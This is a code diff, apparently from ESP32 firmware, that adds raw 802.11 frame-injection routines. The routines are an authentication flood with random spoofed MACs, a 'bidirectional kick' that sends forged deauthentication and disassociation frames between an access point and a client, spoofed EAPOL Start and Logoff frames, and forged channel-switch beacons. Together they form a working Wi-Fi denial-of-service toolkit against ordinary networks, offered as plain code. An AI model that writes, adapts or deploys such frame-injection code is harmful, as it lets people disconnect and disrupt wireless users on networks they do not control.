@@ -100,4 +100,171 @@ bool sendDisassocFrame(const uint8_t* bssid, uint8_t channel, const uint8_t* sta
     return (result == ESP_OK);
 }
 
+static esp_err_t rawTx(const void* buf, int len) {
+    esp_err_t rc = esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
+    if (rc != ESP_OK) rc = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, false);
+    return rc;
+}
+
+static const uint8_t kAssocTail[] = {
+    0x01, 0x08,
+    0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24,
+    0x30, 0x14,
+    0x01, 0x00,
+    0x00, 0x0F, 0xAC, 0x04,
+    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,
+    0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,
+    0x00, 0x00
+};
+
+bool sendAuthentication(const uint8_t* bssid) {
+    if (!bssid) return false;
+    uint8_t f[30] = {};
+    f[0] = 0xB0;
+    memcpy(f + 4, bssid, 6);
+    esp_wifi_get_mac(WIFI_IF_STA, f + 10);
+    memcpy(f + 16, bssid, 6);
+    f[26] = 0x01;
+    return rawTx(f, 30) == ESP_OK;
+}
+
+bool sendAssociationRequest(const uint8_t* bssid, const char* ssid) {
+    if (!bssid || !ssid) return false;
+    uint8_t frame[128];
+    uint8_t ourMac[6];
+    esp_wifi_get_mac(WIFI_IF_STA, ourMac);
+    uint16_t len = 0;
+    frame[len++] = 0x00;
+    frame[len++] = 0x00;
+    frame[len++] = 0x00;
+    frame[len++] = 0x00;
+    memcpy(frame + len, bssid, 6); len += 6;
+    memcpy(frame + len, ourMac, 6); len += 6;
+    memcpy(frame + len, bssid, 6); len += 6;
+    frame[len++] = 0x00;
+    frame[len++] = 0x00;
+    frame[len++] = 0x11;
+    frame[len++] = 0x00;
+    frame[len++] = 0x0A;
+    frame[len++] = 0x00;
+    uint8_t sl = (uint8_t)strlen(ssid);
+    if (sl > 32) sl = 32;
+    frame[len++] = 0x00;
+    frame[len++] = sl;
+    memcpy(frame + len, ssid, sl); len += sl;
+    memcpy(frame + len, kAssocTail, sizeof(kAssocTail));
+    len += sizeof(kAssocTail);
+    return rawTx(frame, len) == ESP_OK;
+}
+
+static const uint8_t kEapolTail[] = {
+    0x00, 0x00,
+    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E,
+    0x01, 0x00, 0x00, 0x00
+};
+
+bool sendEAPOLStart(const uint8_t* bssid, const uint8_t* clientMac) {
+    if (!bssid || !clientMac) return false;
+    uint8_t f[36];
+    f[0] = 0x08; f[1] = 0x01; f[2] = 0x00; f[3] = 0x00;
+    memcpy(f + 4, bssid, 6);
+    memcpy(f + 10, clientMac, 6);
+    memcpy(f + 16, bssid, 6);
+    memcpy(f + 22, kEapolTail, sizeof(kEapolTail));
+    f[33] = 0x01;
+    return rawTx(f, 36) == ESP_OK;
+}
+
+bool sendEAPOLLogoff(const uint8_t* bssid, const uint8_t* clientMac) {
+    if (!bssid || !clientMac) return false;
+    uint8_t f[36];
+    f[0] = 0x08; f[1] = 0x01; f[2] = 0x00; f[3] = 0x00;
+    memcpy(f + 4, bssid, 6);
+    memcpy(f + 10, clientMac, 6);
+    memcpy(f + 16, bssid, 6);
+    memcpy(f + 22, kEapolTail, sizeof(kEapolTail));
+    f[33] = 0x02;
+    return rawTx(f, 36) == ESP_OK;
+}
+
+bool sendCSABeacon(const uint8_t* bssid, const char* ssid,
+                   uint8_t currentChan, uint8_t targetChannel, uint8_t switchCount) {
+    if (!bssid) return false;
+    if (!ssid) ssid = "";
+    uint8_t frame[128] = {};
+    uint16_t len = 0;
+    frame[len++] = 0x80;
+    frame[len++] = 0x00;
+    frame[len++] = 0x00;
+    frame[len++] = 0x00;
+    memset(frame + len, 0xFF, 6); len += 6;
+    memcpy(frame + len, bssid, 6); len += 6;
+    memcpy(frame + len, bssid, 6); len += 6;
+    frame[len++] = 0x00;
+    frame[len++] = 0x00;
+    len += 8;
+    frame[len++] = 0x64;
+    frame[len++] = 0x00;
+    frame[len++] = 0x31;
+    frame[len++] = 0x00;
+    uint8_t sl = (uint8_t)strlen(ssid);
+    if (sl > 32) sl = 32;
+    frame[len++] = 0x00;
+    frame[len++] = sl;
+    memcpy(frame + len, ssid, sl); len += sl;
+    frame[len++] = 0x01; frame[len++] = 0x08;
+    frame[len++] = 0x82; frame[len++] = 0x84;
+    frame[len++] = 0x8B; frame[len++] = 0x96;
+    frame[len++] = 0x0C; frame[len++] = 0x12;
+    frame[len++] = 0x18; frame[len++] = 0x24;
+    frame[len++] = 0x03; frame[len++] = 0x01; frame[len++] = currentChan;
+    frame[len++] = 0x25; frame[len++] = 0x03;
+    frame[len++] = 0x01;
+    frame[len++] = targetChannel;
+    frame[len++] = switchCount ? switchCount : 1;
+    return rawTx(frame, len) == ESP_OK;
+}
+
+bool sendAuthFlood(const uint8_t* bssid, uint8_t count) {
+    if (!bssid || count == 0) return false;
+    uint8_t f[30] = {};
+    f[0] = 0xB0;
+    memcpy(f + 4, bssid, 6);
+    memcpy(f + 16, bssid, 6);
+    f[26] = 0x01;
+    if (count > 12) count = 12;
+    for (uint8_t i = 0; i < count; i++) {
+        esp_fill_random(f + 10, 6);
+        f[10] = (uint8_t)((f[10] & 0xFC) | 0x02);
+        rawTx(f, 30);
+    }
+    return true;
+}
+
+void sendBidirectionalKick(const uint8_t* bssid, const uint8_t* client, uint8_t reason, uint8_t rounds) {
+    if (!bssid || !client) return;
+    if (rounds < 1) rounds = 1;
+    if (rounds > 6) rounds = 6;
+    uint8_t ap2cl[26] = {};
+    memcpy(ap2cl + 4, client, 6);
+    memcpy(ap2cl + 10, bssid, 6);
+    memcpy(ap2cl + 16, bssid, 6);
+    ap2cl[24] = reason;
+    uint8_t cl2ap[26] = {};
+    memcpy(cl2ap + 4, bssid, 6);
+    memcpy(cl2ap + 10, client, 6);
+    memcpy(cl2ap + 16, bssid, 6);
+    cl2ap[24] = reason;
+    for (uint8_t i = 0; i < rounds; i++) {
+        ap2cl[0] = 0xC0;
+        rawTx(ap2cl, 26);
+        cl2ap[0] = 0xC0;
+        rawTx(cl2ap, 26);
+        ap2cl[0] = 0xA0;
+        rawTx(ap2cl, 26);
+        cl2ap[0] = 0xA0;
+        rawTx(cl2ap, 26);
+    }
+}
+
 }
